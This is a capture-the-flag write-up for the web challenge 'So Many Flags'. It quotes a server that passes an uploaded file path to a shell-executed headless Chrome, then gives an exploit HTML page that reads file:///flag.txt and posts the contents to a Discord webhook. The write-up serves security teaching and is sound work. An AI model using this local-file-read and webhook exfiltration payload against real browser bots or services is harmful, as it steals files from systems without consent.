

---

# 🌐 So Many Flags 🏳️

```
Author @ Sera
```

## 🚀 Challenge 
**Category:** Web  
**Description:**  
I heard you like flags, so I launched Chrome with a lot of flags so you can get your flag! The flag is in `/flag.txt`, and the bot will visit the HTML file you uploaded!

🔗 **Target:** [https://coming-home--diddy-dirty-money-4054.ctf.kitctf.de/](https://coming-home--diddy-dirty-money-4054.ctf.kitctf.de/)

---

## 🛠️ Solution
### 1️⃣ Step 1: Enumeration
The challenge gives us a website where you can upload HTML files. When the file is uploaded, a bot visits the file using a headless Chrome browser containing the flag/s.

### 2️⃣ Step 2: Analyzing the Server Code
Provided file: `so-many-flags.tar.gz`  
We can extract the zip showing `Dockerfile`, `server.js`, `package.json`, and `flags.txt` files.

Analyzing the backend server file, we can see a critical flaw in `server.js`:
```javascript
app.post('/submit', upload.single('htmlFile'), (req, res) => {
  const { filename, path: filePath } = req.file;
  const command = `bash -c "google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run ${flags} ${filePath}"`;
  res.send('File uploaded and processed successfully. Launched Chrome:<br><br>' + command);
  exec(command);
});
```
This code uploads the HTML file and executes it in a Chrome browser with flags.

### 3️⃣ Step 3: Making our Exploit
To read the `/flag.txt` file and obtain our flag, we can make an HTML file that uses JavaScript to fetch the content within the `/flag.txt` file and send it to a webhook.

We leveraged the critical flaw within the server file with our own HTML file to obtain the flag.
`exploit.html`:
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Attempt to Read Flag</h1>
  <script>
    fetch('file:///flag.txt')
      .then(response => response.text())
      .then(data => {
        const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
        const message = {
          content: `Flag: ${data}`
        };
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(message)
        });
      })
      .catch(error => console.error('Error:', error));
  </script>
</body>
</html>
```

### 4️⃣ Step 4: Executing and Grabbing the Flag
1. **Upload the File:** Go to the target website and upload the `exploit.html` file.
2. **Check the Discord Webhook:** The flag should be sent to the Discord webhook successfully. 

---

## 🏁 Conclusion
We were able to obtain the key by reading the `/flag.txt` file using a headless Chrome browser. We did this by leveraging the bot to access local files and send the file contents to our Discord webhook using JavaScript.

## 🎉 Flag
```
Flag: GPNCTF{CL1_FL4G5_4R3_FL4G5_T00}
```

---
